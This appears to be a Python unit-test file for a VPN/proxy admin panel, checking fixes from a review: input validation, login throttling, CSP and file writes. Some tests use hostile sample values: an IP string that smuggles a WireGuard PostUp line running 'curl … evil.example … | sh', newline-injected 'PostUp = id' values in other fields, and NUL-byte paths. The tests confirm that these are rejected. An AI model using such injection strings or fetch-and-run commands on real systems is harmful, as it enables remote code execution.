"""1.21.0, исправления по отчёту проверки (Opus, 2026-11-16): проверка входящих данных, мелкие ошибки
(этап 1), интерфейс (этап 2), движок (этап 3), сеть и безопасность (этап 4).

python3 -m unittest discover tests
"""
import json
import os
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

os.environ.setdefault("DATA_DIR", tempfile.mkdtemp())
os.environ.setdefault("DRY_RUN", "1")
os.environ.setdefault("PANEL_PASSWORD", "test-password")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app import awgserver, domains, engine, lists, main, probe, store, tgbot  # noqa: E402
from app.web import HTTPError  # noqa: E402


class Req:
    def __init__(self, body, ip="203.0.113.77"):
        self.body = body
        self.client_ip = ip
        self.headers = {}
        self.set_cookies = []

    def json(self):
        return self.body

    def cookie(self, *a, **kw):
        pass


def code(fn):
    try:
        fn()
    except HTTPError as e:
        return e.code, getattr(e.detail, "key", None)
    return 200, None


# ============================================================ этап 1: внешний адрес и конфиги (Б 1)
EVIL = "198.51.100.7\n[Interface]\nPostUp = curl -s http://evil.example/x | sh #"


class ProbeIpTest(unittest.TestCase):
    def test_ip_of(self):
        self.assertEqual(probe.ip_of(" 203.0.113.5\n"), "203.0.113.5")
        self.assertEqual(probe.ip_of("2001:db8::1"), "2001:db8::1")
        for bad in (EVIL, "", None, "example.com", "1.2.3.4 5.6.7.8"):
            with self.assertRaises(ValueError):
                probe.ip_of(bad)

    def test_whoami_rejects_spoofed_answers(self):
        """1.1.1.1 молчит, а ответы по HTTP подменены: адреса нет, а не строка с PostUp."""
        def get(host, path, tls=False):
            if host == "1.1.1.1":
                raise OSError("timed out")
            if host == "ip-api.com":
                return json.dumps({"status": "success", "query": EVIL, "countryCode": "XXX"})
            return EVIL
        with mock.patch.object(probe, "http_get", get):
            with self.assertRaises(OSError):
                probe.whoami()

    def test_ifconfig_over_https(self):
        seen = []

        def get(host, path, tls=False):
            seen.append((host, tls))
            if host != "ifconfig.me":
                raise OSError("down")
            return "203.0.113.9\n"
        with mock.patch.object(probe, "http_get", get):
            self.assertEqual(probe.whoami(), {"ip": "203.0.113.9"})
        self.assertIn(("ifconfig.me", True), seen)


class DetectHostTest(unittest.TestCase):
    def run_detect(self, answer):
        d = tempfile.mkdtemp()
        e = engine.Engine(store.Store(os.path.join(d, "state.json")))
        e.target = e._fake
        e.probe = lambda out: answer
        th = threading.Thread(target=e._detect_host, daemon=True)
        th.start()
        time.sleep(0.3)
        e.stop_ev.set()
        th.join(5)
        return e, e.store.snapshot()["settings"]

    def test_spoofed_answer_is_not_saved(self):
        with mock.patch.object(engine.config, "PUBLIC_HOST", ""):
            e, s = self.run_detect({"ok": True, "ip": EVIL})
        self.assertNotIn("public_host", s)
        self.assertIsNone(e.public_v4)

    def test_good_answer_is_saved(self):
        with mock.patch.object(engine.config, "PUBLIC_HOST", ""):
            e, s = self.run_detect({"ok": True, "ip": "203.0.113.44"})
        self.assertEqual(s.get("public_host"), "203.0.113.44")
        self.assertEqual(e.public_v4, "203.0.113.44")

    def test_ipv6_is_not_a_public_v4(self):
        with mock.patch.object(engine.config, "PUBLIC_HOST", ""):
            e, s = self.run_detect({"ok": True, "ip": "2001:db8::5"})
        self.assertNotIn("public_host", s)


class ClientConfOneLineTest(unittest.TestCase):
    KEY = "A" * 43 + "="

    def parts(self, host="203.0.113.5", dns=("1.1.1.1",), keepalive="25"):
        sc = awgserver.new_server(self.KEY, 51820, "10.8.1.0/24", {"Jc": "4"})
        prof = awgserver.ClientProfile(host=host, port=51820, server_pub=self.KEY, dns=list(dns),
                                       keepalive=keepalive)
        return sc, prof, awgserver.Peer(self.KEY, "", "10.8.1.2/32")

    def test_normal_config(self):
        sc, prof, peer = self.parts()
        conf = awgserver.client_conf(sc, prof, peer, self.KEY)
        self.assertIn("Endpoint = 203.0.113.5:51820", conf)

    def test_newline_in_host(self):
        sc, prof, peer = self.parts(host=EVIL)
        for fn in (lambda: awgserver.client_conf(sc, prof, peer, self.KEY),
                   lambda: awgserver.vpn_link(sc, prof, peer, self.KEY, "", "x")):
            with self.assertRaises(awgserver.ServerConfError) as cm:
                fn()
            self.assertEqual(cm.exception.msg.key, "srv.bad_host")

    def test_newline_elsewhere(self):
        sc, prof, peer = self.parts(keepalive="25\nPostUp = id")
        with self.assertRaises(awgserver.ServerConfError):
            awgserver.client_conf(sc, prof, peer, self.KEY)
        sc, prof, peer = self.parts()
        with self.assertRaises(awgserver.ServerConfError):
            awgserver.client_conf(sc, prof, peer, self.KEY, {"I1": "<b 0x00>\nPostUp = id"})


# ============================================================ этап 1: проверка ввода (Б 16, 17, 18)
class InputTypesTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        main.engine.reconcile()

    def test_server_params_not_object(self):
        for v in ("x", ["Jc"], 5, True):
            self.assertEqual(code(lambda: main.put_server(Req({"params": v}))), (400, "err.bad_value"), v)

    def test_rule_enabled_string(self):
        st = main.store.snapshot()
        for v in ("false", "no", 0, 1):
            self.assertEqual(code(lambda: main.v_rules(st, [{"lists": ["ru"], "outbound": "direct",
                                                              "enabled": v}])), (400, "err.bad_value"), v)
        r = main.v_rules(st, [{"lists": ["ru"], "outbound": "direct"}])
        self.assertIs(r[0]["enabled"], True)
        r = main.v_rules(st, [{"lists": ["ru"], "outbound": "direct", "enabled": False}])
        self.assertIs(r[0]["enabled"], False)

    def test_list_update_hours_bool(self):
        self.assertEqual(code(lambda: main.put_settings(Req({"list_update_hours": True}))), (400, "err.hours"))

    def test_restore_flags(self):
        g = main.clean_backup_state(main.store.snapshot())
        g["settings"]["telegram"] = {"token": "123456:" + "A" * 35, "chat_id": "424242",
                                     "enabled": "false", "control": "no"}
        c = main.clean_backup_state(g)["settings"]["telegram"]
        self.assertFalse(c["enabled"])
        self.assertFalse(c["control"])
        g["upstreams"] = [{"id": "uflag", "num": 7, "name": "x", "enabled": "false",
                           "config": "socks5://198.51.100.9:1080"}]
        self.assertEqual(code(lambda: main.clean_backup_state(g)), (400, "err.backup_field"))


class StaticNulTest(unittest.TestCase):
    def test_nul_is_404(self):
        import http.client
        srv = main.app.serve("127.0.0.1", 0)
        th = threading.Thread(target=srv.serve_forever, daemon=True)
        th.start()
        try:
            for path in ("/static/%00", "/static/app.js%00.png", "/s/assets/%00"):
                c = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=5)
                c.request("GET", main.BASE + path if path.startswith("/static") else path)
                self.assertEqual(c.getresponse().status, 404, path)
                c.close()
        finally:
            srv.shutdown()
            srv.server_close()


# ============================================================ этап 1: хранение и мелочи (Б 19, 22, 25, 27, 30)
class StoreWriteFirstTest(unittest.TestCase):
    def test_failed_write_keeps_old_state(self):
        d = tempfile.mkdtemp()
        s = store.Store(os.path.join(d, "state.json"))
        before = s.snapshot()
        with mock.patch.object(s, "_write", side_effect=OSError(28, "No space left on device")):
            with self.assertRaises(OSError):
                s.mutate(lambda st: st["settings"].__setitem__("list_update_hours", 5))
        self.assertEqual(s.snapshot(), before)          # не записали — и не применили
        s.mutate(lambda st: st["settings"].__setitem__("list_update_hours", 6))
        with open(os.path.join(d, "state.json")) as f:
            self.assertEqual(json.load(f)["settings"]["list_update_hours"], 6)


class LoginAttemptsTest(unittest.TestCase):
    def setUp(self):
        main._fails.clear()
        main._inflight.clear()

    def test_parallel_attempts_count(self):
        """24 соединения с одного адреса не проверят 24 пароля разом: идущие проверки тоже считаются."""
        started = []
        for _ in range(main.FAIL_MAX):
            main._check_blocked("198.51.100.1")
            started.append(1)
        self.assertEqual(code(lambda: main._check_blocked("198.51.100.1")), (429, "err.too_many_attempts"))
        for _ in started:
            main._done("198.51.100.1")
        main._check_blocked("198.51.100.1")         # закончились — снова можно
        main._done("198.51.100.1")

    def test_old_addresses_forgotten(self):
        main._fails["198.51.100.2"] = [time.time() - main.FAIL_WINDOW - 5]
        main._check_blocked("198.51.100.3")
        main._done("198.51.100.3")
        self.assertNotIn("198.51.100.2", main._fails)

    def test_wrong_password_still_blocks(self):
        with mock.patch.object(main.time, "sleep"):
            for _ in range(main.FAIL_MAX):
                self.assertEqual(code(lambda: main.login(Req({"password": "nope"}, "198.51.100.4"))),
                                 (403, "err.wrong_password"))
        self.assertEqual(code(lambda: main.login(Req({"password": "nope"}, "198.51.100.4"))),
                         (429, "err.too_many_attempts"))
        self.assertEqual(main._inflight, {})


class BotTextTest(unittest.TestCase):
    def test_braces_in_name(self):
        key = next(k for k, v in tgbot.TEXTS["en"].items() if "{name}" in v and "{gb}" in v)
        out = tgbot.tr("en", key, name="{gb}", gb=15)
        self.assertIn("{gb}", out)


class ListWriteTest(unittest.TestCase):
    def test_parallel_writes_leave_whole_file(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "x.txt")
        texts = ["".join(f"{i}.{j}.0.0/16\n" for j in range(200)) for i in range(1, 9)]
        ths = [threading.Thread(target=domains.write_atomic, args=(p, t)) for t in texts]
        for th in ths:
            th.start()
        for th in ths:
            th.join()
        with open(p) as f:
            self.assertIn(f.read(), texts)
        self.assertEqual([x for x in os.listdir(d) if x.endswith(".tmp")], [])

    def test_refresh_one_at_a_time(self):
        inside, most = [0], [0]

        def slow(lst, stats=None):
            inside[0] += 1
            most[0] = max(most[0], inside[0])
            time.sleep(0.05)
            inside[0] -= 1
            return []
        with mock.patch.object(lists, "fetch_list", slow):
            ths = [threading.Thread(target=lists.refresh, args=({"id": "lpar", "kind": "manual", "source": ""},))
                   for _ in range(4)]
            for th in ths:
                th.start()
            for th in ths:
                th.join()
        self.assertEqual(most[0], 1)


class HelperLogTrimTest(unittest.TestCase):
    def test_trim(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "sniproxy.log")
        with open(p, "wb") as f:
            for i in range(200000):
                f.write(f"2026-11-16 line {i:06d} {'x' * 20}\n".encode())
        engine._trim_log(p)
        self.assertLessEqual(os.path.getsize(p), engine.LOG_KEEP)
        with open(p, "rb") as f:
            data = f.read()
        self.assertTrue(data.startswith(b"2026-11-16 line "))          # с начала строки
        self.assertTrue(data.rstrip().endswith(b"line 199999 " + b"x" * 20))
        small = os.path.join(d, "dnsproxy.log")
        with open(small, "w") as f:
            f.write("ok\n")
        engine._trim_log(small)
        with open(small) as f:
            self.assertEqual(f.read(), "ok\n")


# ============================================================ этап 2: интерфейс (Б 10, 12, 13, 14)
class CspTest(unittest.TestCase):
    def test_header_on_pages_only(self):
        import http.client
        srv = main.app.serve("127.0.0.1", 0)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            c = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=5)
            c.request("GET", main.BASE + "/")
            r = c.getresponse()
            r.read()
            csp = r.getheader("Content-Security-Policy") or ""
            self.assertIn("script-src 'self'", csp)
            self.assertIn("frame-ancestors 'none'", csp)
            self.assertNotIn("unsafe-eval", csp)
            c.request("GET", main.BASE + "/api/state")
            r = c.getresponse()
            r.read()
            self.assertIsNone(r.getheader("Content-Security-Policy"))
            c.close()
        finally:
            srv.shutdown()
            srv.server_close()

    def test_no_inline_scripts(self):
        """CSP без 'unsafe-inline' для скриптов: на страницах нет встроенных скриптов и обработчиков."""
        import re
        static = os.path.join(os.path.dirname(__file__), "..", "app", "static")
        for name in ("index.html", "share.html"):
            with open(os.path.join(static, name)) as f:
                html = f.read()
            self.assertFalse(re.search(r"<script(?![^>]*\bsrc=)", html), name)
            self.assertFalse(re.search(r"\son[a-z]+\s*=", html), name)
        for name in ("app.js", "share.js", "i18n.js", "qrcode.js"):
            with open(os.path.join(static, name)) as f:
                js = f.read()
            self.assertNotIn("eval(", js, name)
            self.assertNotIn("new Function", js, name)
            self.assertNotIn("javascript:", js, name)


class ListsInBackgroundTest(unittest.TestCase):
    def test_needs_net(self):
        self.assertTrue(main._needs_net({"kind": "country", "source": "de"}))
        self.assertTrue(main._needs_net({"kind": "url", "source": "https://x.example/l.txt"}))
        self.assertTrue(main._needs_net({"kind": "domains", "source": "youtube.com\nhttps://x.example/d.txt"}))
        self.assertFalse(main._needs_net({"kind": "domains", "source": "youtube.com"}))
        self.assertFalse(main._needs_net({"kind": "manual", "source": "10.0.0.0/8"}))

    def test_add_country_does_not_wait(self):
        gate = threading.Event()

        def slow(lst, stats=None):
            gate.wait(5)
            raise lists.ListError(main.Msg("list.empty"))
        st0 = main.store.snapshot()
        try:
            with mock.patch.object(lists, "fetch_list", slow):
                t0 = time.time()
                r = main.add_list(Req({"kind": "country", "source": "nl"}))
                self.assertLess(time.time() - t0, 1)
                self.assertTrue(r["busy"])
                view = next(x for x in main.get_state(Req({}))["lists"] if x["id"] == "nl")
                self.assertTrue(view["busy"])
                gate.set()
                for _ in range(50):
                    if "nl" not in main.engine.lists_busy:
                        break
                    time.sleep(0.05)
            l = main.Store.lst(main.store.snapshot(), "nl")
            self.assertTrue(l.get("error"))
            self.assertNotIn("nl", main.engine.lists_busy)
        finally:
            main.store.mutate(lambda st: (st.clear(), st.update(st0)))

    def test_manual_still_immediate(self):
        st0 = main.store.snapshot()
        try:
            r = main.add_list(Req({"kind": "manual", "source": "10.0.0.0/8\n1.2.3.0/24", "name": "m"}))
            self.assertFalse(r["busy"])
            self.assertEqual(r["count"], 2)
        finally:
            main.store.mutate(lambda st: (st.clear(), st.update(st0)))


class UiGuardsTest(unittest.TestCase):
    """Б 12, 13 — проверка по тексту app.js (браузерная проверка — Playwright, вне юнит-тестов)."""
    def setUp(self):
        with open(os.path.join(os.path.dirname(__file__), "..", "app", "static", "app.js")) as f:
            self.js = f.read()

    def test_server_tab_leave_guard(self):
        self.assertIn('if (tab === "server" && srvDirty()) return confirm(t("srv.leave"));', self.js)
        self.assertIn('(tab === "server" && srvDirty())', self.js.split('"beforeunload"', 1)[1][:200])

    def test_stale_state_dropped(self):
        self.assertIn("if (seq < stateShown) return;", self.js)


if __name__ == "__main__":
    unittest.main()
